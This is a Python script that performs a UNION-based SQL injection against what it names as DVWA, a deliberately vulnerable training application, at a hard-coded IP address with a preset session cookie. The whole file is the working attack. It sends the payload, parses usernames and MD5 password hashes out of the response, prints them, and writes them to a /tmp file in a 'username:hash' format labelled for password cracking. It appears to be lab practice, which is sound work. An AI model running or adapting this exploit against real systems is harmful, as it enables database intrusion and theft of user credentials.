
import requests
import re
import html

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[+] ===== EXTRACTING ALL USER DATA FROM DVWA =====\n")

payload = "999' UNION SELECT user, password FROM users -- -"

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Find all <pre> blocks which contain the results
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    
    users_found = []
    
    for block_idx, block in enumerate(pre_blocks):
        # Decode HTML entities
        block_decoded = html.unescape(block)
        
        # Split by <br /> to get lines
        lines = block_decoded.split('<br />')
        
        if len(lines) >= 3:
            # Parse lines
            id_line = lines[0]
            firstname_line = lines[1]
            surname_line = lines[2]
            
            # Extract values
            id_match = re.search(r'ID:\s*(.+?)$', id_line)
            username_match = re.search(r'First name:\s*(.+?)$', firstname_line)
            hash_match = re.search(r'Surname:\s*(.+?)$', surname_line)
            
            if id_match and username_match and hash_match:
                id_val = id_match.group(1).strip()
                username = username_match.group(1).strip()
                password_hash = hash_match.group(1).strip()
                
                # Skip the first block (which is the injection query itself)
                if block_idx > 0 or (block_idx == 0 and "UNION" not in id_val):
                    users_found.append((id_val, username, password_hash))
                    print(f"[+] Extracted: ID={id_val}, Username={username}, Hash={password_hash}")
    
    if users_found:
        print(f"\n[+] ===== SUCCESSFULLY EXTRACTED {len(users_found)} USER(S) =====\n")
        print("=" * 120)
        print(f"{'User ID':<10} | {'Username':<25} | {'Password Hash (MD5)':<75}")
        print("=" * 120)
        for id_val, username, password_hash in users_found:
            print(f"{id_val:<10} | {username:<25} | {password_hash:<75}")
        print("=" * 120)
        
        # Save to file
        with open('/tmp/extracted_users.txt', 'w') as f:
            f.write("=" * 120 + "\n")
            f.write("EXTRACTED USER DATA FROM DVWA - SQL INJECTION VULNERABILITY\n")
            f.write("=" * 120 + "\n\n")
            
            f.write("SQL INJECTION PAYLOAD USED:\n")
            f.write(f"  {payload}\n\n")
            
            f.write(f"{'User ID':<10} | {'Username':<25} | {'Password Hash (MD5)':<75}\n")
            f.write("-" * 120 + "\n")
            for id_val, username, password_hash in users_found:
                f.write(f"{id_val:<10} | {username:<25} | {password_hash:<75}\n")
            f.write("=" * 120 + "\n\n")
            
            f.write("DETAILED USER INFORMATION:\n")
            f.write("-" * 120 + "\n")
            for idx, (id_val, username, password_hash) in enumerate(users_found, 1):
                f.write(f"\n[{idx}] USER RECORD:\n")
                f.write(f"    User ID:        {id_val}\n")
                f.write(f"    Username:       {username}\n")
                f.write(f"    Password Hash:  {password_hash}\n")
                f.write(f"    Hash Type:      MD5 (32 hexadecimal characters)\n")
                f.write(f"    Hash Length:    {len(password_hash)} characters\n")
            
            f.write("\n" + "=" * 120 + "\n")
            f.write("HASH FORMAT (for cracking):\n")
            f.write("-" * 120 + "\n")
            for id_val, username, password_hash in users_found:
                f.write(f"{username}:{password_hash}\n")
            
            f.write("\n" + "=" * 120 + "\n")
            f.write("EXTRACTION SUMMARY:\n")
            f.write(f"  Total Users Extracted:  {len(users_found)}\n")
            f.write(f"  Extraction Method:      SQL Injection (UNION-based)\n")
            f.write(f"  Database Table:         users\n")
            f.write(f"  Columns Retrieved:      user, password\n")
            f.write(f"  Vulnerable Parameter:   id (GET parameter)\n")
            f.write(f"  Attack Vector:          ' UNION SELECT user, password FROM users -- -\n")
            f.write(f"  Application:            DVWA (Damn Vulnerable Web Application)\n")
            f.write(f"  Target URL:             http://31.97.117.123/vulnerabilities/sqli/\n")
            f.write("=" * 120 + "\n")
        
        print(f"\n[+] Total users extracted: {len(users_found)}")
        print(f"[+] Data saved to: /tmp/extracted_users.txt")
        
        print("\n[*] Hash Type Analysis:")
        print("-" * 50)
        for id_val, username, password_hash in users_found:
            hash_len = len(password_hash)
            print(f"  {username:<20} -> MD5 Hash ({hash_len} chars)")
        
        # Print the data in a format suitable for password cracking
        print("\n[*] Username:Hash format (for password cracking):")
        print("-" * 50)
        for id_val, username, password_hash in users_found:
            print(f"{username}:{password_hash}")
    else:
        print("[-] No user data could be extracted")
    
except Exception as e:
    print(f"[-] Error during extraction: {e}")
    import traceback
    traceback.print_exc()

